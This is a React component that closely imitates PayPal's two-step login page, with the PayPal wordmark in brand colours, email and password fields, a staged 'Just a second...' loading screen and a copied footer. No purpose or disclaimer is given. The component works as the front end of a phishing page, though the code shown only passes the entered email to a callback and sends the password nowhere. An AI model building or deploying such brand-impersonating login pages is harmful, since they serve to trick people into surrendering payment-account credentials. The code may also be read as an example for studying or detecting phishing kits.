import { useEffect, useState } from 'react';
interface LoginPageProps {
  onLoginSuccess: (email: string) => void;
}

export function LoginPage({ onLoginSuccess }: LoginPageProps) {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [step, setStep] = useState<'email' | 'loading' | 'password'>('email');

  const handleNext = () => {
    if (email.trim()) {
      setStep('loading');
    }
  };

  const handleLogin = () => {
    onLoginSuccess(email);
  };

  const handleChange = () => {
    setStep('email');
    setPassword('');
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (step === 'email') {
      handleNext();
    } else if (step === 'password') {
      handleLogin();
    }
  };

  useEffect(() => {
    if (step === 'loading') {
      const timer = setTimeout(() => {
        setStep('password');
      }, 3000);
      return () => clearTimeout(timer);
    }
  }, [step]);
  return (
    <div className="relative min-h-screen w-full bg-[#f5f7fa] flex flex-col items-center justify-between font-['Inter',sans-serif]">
      {/* Loading Overlay */}
      {step === 'loading' && (
        <div className="absolute inset-0 z-50 bg-white flex flex-col items-center justify-center">
          <div className="flex flex-col items-center gap-4">
            <div className="relative w-12 h-12">
              <div className="absolute inset-0 border-2 border-gray-100 rounded-full"></div>
              <div 
                className="absolute inset-0 border-2 border-t-[#0070BA] border-r-transparent border-b-transparent border-l-transparent rounded-full animate-spin"
                style={{ animationDuration: '0.8s' }}
              ></div>
            </div>
            <p className="text-[#2C2E2F] text-[18px] font-normal">Just a second...</p>
          </div>
        </div>
      )}

      {/* Main Card */}
      <div className="flex-1 flex items-center justify-center w-full px-4 py-12">
        <div className="w-full max-w-[500px] bg-white rounded-2xl shadow-sm border border-gray-100 px-8 py-12 flex flex-col items-center">
          {/* PayPal Logo */}
          <h1 className="text-3xl font-black tracking-tight text-gray-900 mb-10">
            <span className="text-[#003087]">Pay</span>
            <span className="text-[#0079C1]">Pal</span>
          </h1>

          <form onSubmit={handleSubmit} className="w-full flex flex-col items-center">
            {step === 'email' || step === 'loading' ?
            <>
                {/* Email Input */}
                <div className="w-full mb-2">
                  <div className="relative w-full">
                    <input
                    type="text"
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    placeholder=" "
                    className="peer w-full px-4 pt-6 pb-3 border-2 border-gray-300 rounded-lg text-base text-gray-900 outline-none focus:border-[#0079C1] transition-colors" />
                  
                    <label className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-500 text-base pointer-events-none transition-all peer-focus:top-3.5 peer-focus:text-xs peer-focus:text-[#0079C1] peer-[:not(:placeholder-shown)]:top-3.5 peer-[:not(:placeholder-shown)]:text-xs">
                      Email or mobile number
                    </label>
                  </div>
                </div>

                {/* Forgot Email */}
                <div className="w-full mb-6 text-left self-start">
                  <a
                  href="#"
                  className="text-[#0079C1] text-sm font-semibold hover:underline">
                  
                    Forgot email?
                  </a>
                </div>

                {/* Next Button */}
                <button
                type="submit"
                className="w-full py-3.5 bg-[#0070BA] hover:bg-[#005EA6] text-white font-bold text-base rounded-full transition-colors mb-6">
                
                  Next
                </button>
              </> :

            <>
                {/* Email Display with Change */}
                <div className="flex items-center gap-3 mb-8 self-start">
                  <span className="text-base text-gray-900">{email}</span>
                  <button
                  type="button"
                  onClick={handleChange}
                  className="text-[#0079C1] text-base font-semibold hover:underline">
                  
                    Change
                  </button>
                </div>

                {/* Password Input */}
                <div className="w-full mb-2">
                  <div className="relative w-full flex gap-2">
                    <div className="relative flex-1">
                      <input
                      type={showPassword ? 'text' : 'password'}
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      placeholder=" "
                      className="peer w-full px-4 pt-6 pb-3 border-2 border-gray-300 rounded-lg text-base text-gray-900 outline-none focus:border-[#0079C1] transition-colors bg-[#FFF9DB]" />
                    
                      <label className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-500 text-sm pointer-events-none transition-all peer-focus:top-3.5 peer-focus:text-xs peer-focus:text-[#0079C1] peer-[:not(:placeholder-shown)]:top-3.5 peer-[:not(:placeholder-shown)]:text-xs">
                        Password
                      </label>
                    </div>
                    <button
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    className="px-3 py-2 border-2 border-gray-300 rounded-lg text-[#0079C1] text-sm font-semibold hover:border-[#0079C1] transition-colors shrink-0">
                    
                      {showPassword ? 'Hide' : 'Show'}
                    </button>
                  </div>
                </div>

                {/* Forgot Password */}
                <div className="w-full mb-6 text-left self-start">
                  <a
                  href="#"
                  className="text-[#0079C1] text-sm font-semibold hover:underline">
                  
                    Forgot password?
                  </a>
                </div>

                {/* Log In Button */}
                <button 
                  type="submit"
                  className="w-full py-3.5 bg-[#0070BA] hover:bg-[#005EA6] text-white font-bold text-base rounded-full transition-colors mb-6"
                >
                  Log In
                </button>
              </>
            }
          </form>

          {/* Divider */}
          <div className="w-full flex items-center gap-4 mb-6">
            <div className="flex-1 h-px bg-gray-300" />
            <span className="text-gray-500 text-sm">or</span>
            <div className="flex-1 h-px bg-gray-300" />
          </div>

          {/* Sign Up Button */}
          <button className="w-full py-3.5 border-2 border-gray-800 text-gray-900 font-bold text-base rounded-full hover:bg-gray-50 transition-colors mb-10">
            Sign Up
          </button>

          {/* Language Selector */}
          <div className="flex items-center gap-2 text-sm text-gray-600 mt-auto">
            <span className="text-lg">🇺🇸</span>
            <span className="font-semibold text-gray-900">English</span>
            <span className="text-gray-300">|</span>
            <a href="#" className="hover:underline">
              Français
            </a>
            <span className="text-gray-300">|</span>
            <a href="#" className="hover:underline">
              Español
            </a>
            <span className="text-gray-300">|</span>
            <a href="#" className="hover:underline">
              中文
            </a>
          </div>
        </div>
      </div>

      {/* Footer */}
      <footer className="w-full bg-gray-800 py-4 px-6">
        <div className="flex items-center justify-center gap-4 text-xs text-gray-300 flex-wrap">
          <a href="#" className="hover:text-white hover:underline">
            Contact Us
          </a>
          <a href="#" className="hover:text-white hover:underline">
            Privacy
          </a>
          <a href="#" className="hover:text-white hover:underline">
            Legal
          </a>
          <a href="#" className="hover:text-white hover:underline">
            Policy Updates
          </a>
          <a href="#" className="hover:text-white hover:underline">
            Worldwide
          </a>
        </div>
      </footer>
    </div>);

}